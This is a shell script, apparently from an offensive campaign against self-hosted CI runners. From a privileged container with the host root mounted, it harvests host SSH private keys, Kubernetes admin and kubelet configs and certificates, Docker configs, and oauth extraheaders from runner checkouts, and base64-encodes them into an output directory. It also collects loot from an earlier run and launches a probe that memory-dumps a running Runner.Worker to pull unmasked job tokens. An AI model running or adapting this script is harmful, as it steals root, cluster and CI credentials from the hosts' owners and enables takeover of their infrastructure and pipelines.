#!/bin/sh
# i14987 privileged helper: runs as root in a --privileged --pid=host
# --network=host container with the host root at /host and a writable /out.
# 1) capture per-host root material (/root/.kube/config, /root/.ssh keys,
#    /etc/kubernetes/*, /etc/docker/daemon.json), every runner _work
#    .git/config (extraheader material) and one GPU inventory (hy-smi);
# 2) dump at most ONE executing Runner.Worker on this host via the .NET
#    diagnostics IPC, scan it for unmasked job tokens, delete every dump.
set +e
OUT=${I14987_OUT:-/out}
H=${I14987_HOSTROOT:-/host}
export HOME=/tmp
SELF=$(cat $H/etc/hostname 2>/dev/null | tr -d '\n'); [ -n "$SELF" ] || SELF=$(hostname)
echo "$SELF" > $OUT/self_host.txt
{
  echo "=== id ==="; id; hostname; uname -a; date -u
  echo "=== root dirs ==="; ls -la $H/root/.ssh $H/root/.kube 2>&1 | head -50
  echo "=== k8s ==="; ls -la $H/etc/kubernetes 2>&1 | head -30; ls -la $H/etc/kubernetes/ssl 2>&1 | head -50
  echo "=== docker cfg ==="; ls -la $H/etc/docker 2>&1 | head -20
} > $OUT/helper3_id.txt 2>&1

# carry over anything intent-14206 left in /home/github/i14206p2 that github@
# could not read (it was written by root)
mkdir -p $OUT/prev
for f in run.log helper3_id.txt rootmat_b64.txt root_probe.out root_probe.err; do
  [ -f $H/home/github/i14206p2/$f ] && cp $H/home/github/i14206p2/$f $OUT/prev/prev_$f 2>/dev/null
done
ls -la $OUT/prev >> $OUT/helper3_id.txt 2>&1

mkdir -p $OUT/rootmat; chmod 700 $OUT/rootmat
N=0
addf() {
  [ -f "$1" ] || return 0
  N=$((N+1))
  cp "$1" "$OUT/rootmat/$2" 2>/dev/null
}
addf $H/root/.kube/config root_kube_config
addf $H/root/.ssh/id_rsa root_ssh_id_rsa
addf $H/root/.ssh/id_ed25519 root_ssh_id_ed25519
addf $H/root/.ssh/id_ecdsa root_ssh_id_ecdsa
addf $H/root/.ssh/id_rsa.pub root_ssh_id_rsa.pub
addf $H/root/.ssh/id_ed25519.pub root_ssh_id_ed25519.pub
addf $H/root/.ssh/authorized_keys root_ssh_authorized_keys
addf $H/root/.ssh/known_hosts root_ssh_known_hosts
addf $H/home/github/.ssh/authorized_keys github_ssh_authorized_keys
addf $H/etc/kubernetes/admin.conf etc_kubernetes_admin.conf
addf $H/etc/kubernetes/kubelet.conf etc_kubernetes_kubelet.conf
addf $H/etc/kubernetes/controller-manager.conf etc_kubernetes_controller-manager.conf
addf $H/etc/kubernetes/scheduler.conf etc_kubernetes_scheduler.conf
addf $H/etc/kubernetes/bootstrap-kubelet.kubeconfig etc_kubernetes_bootstrap-kubelet.kubeconfig
addf $H/etc/kubernetes/kubelet.kubeconfig etc_kubernetes_kubelet.kubeconfig
addf $H/etc/kubernetes/kube-proxy.kubeconfig etc_kubernetes_kube-proxy.kubeconfig
addf $H/etc/docker/daemon.json etc_docker_daemon.json
addf $H/etc/docker/docker_env.conf etc_docker_docker_env.conf
for f in $H/etc/kubernetes/ssl/*; do
  [ -f "$f" ] || continue
  [ $N -ge 40 ] && break
  addf "$f" "etc_kubernetes_ssl_$(basename "$f")"
done
{
  echo "ROOTMAT=$N"
  for f in $OUT/rootmat/*; do
    [ -f "$f" ] || continue
    echo "FILE $(basename "$f") $(wc -c < "$f")"
    base64 -w0 "$f" 2>/dev/null; echo
  done
} > $OUT/rootmat_b64.txt
rm -rf $OUT/rootmat

# every runner _work checkout .git/config (extraheader / oauth2 material)
{
  i=0
  for c in $H/home/*/actions-runner*/_work/*/.git/config $H/home/*/actions-runner*/_work/*/*/.git/config \
           $H/home/*/ci-runners/*/_work/*/.git/config $H/home/*/ci-runners/*/_work/*/*/.git/config \
           $H/home/*/actions-runner*/_work/*/*/*/.git/config; do
    [ -f "$c" ] || continue
    i=$((i+1)); [ $i -gt 40 ] && break
    echo "CFG $c $(wc -c < "$c") $(sha256sum "$c" | cut -d' ' -f1)"
    base64 -w0 "$c"; echo
  done
  echo "CFGCOUNT=$i"
} > $OUT/gitcfg_b64.txt 2>&1

# one GPU inventory for level-3 evidence
{
  echo "=== container hy-smi $(date -u) ==="
  command -v hy-smi 2>&1
  hy-smi 2>&1 | head -80
  command -v nvidia-smi 2>&1
  nvidia-smi 2>&1 | head -30
  echo "=== devices ==="; ls -l /dev/dri /dev/kfd 2>&1 | head -20
  echo "=== chroot host ==="
  chroot $H /bin/sh -c 'export PATH=$PATH:/usr/local/bin:/opt/hyhal/bin; command -v hy-smi; hy-smi 2>&1 | head -80; echo ---NVIDIA---; command -v nvidia-smi; nvidia-smi 2>&1 | head -30; echo ---DEV---; ls -l /dev/dri /dev/kfd 2>&1 | head -20' 2>&1 | head -180
} > $OUT/gpu.txt 2>&1

# one executing Runner.Worker, bounded poll, dumps deleted by the probe
I12886_TAG=root_$SELF I12886_MAXD=1 I12886_WAIT=50 I12886_PREFER="" I12886_SKIP="" \
  timeout 480 python3 $OUT/i14987_host_probe.py > $OUT/root_probe.out 2> $OUT/root_probe.err
echo "probe_rc=$?" >> $OUT/helper3_id.txt
ls -la $OUT >> $OUT/helper3_id.txt 2>&1
chmod -R a+rX $OUT 2>/dev/null
exit 0
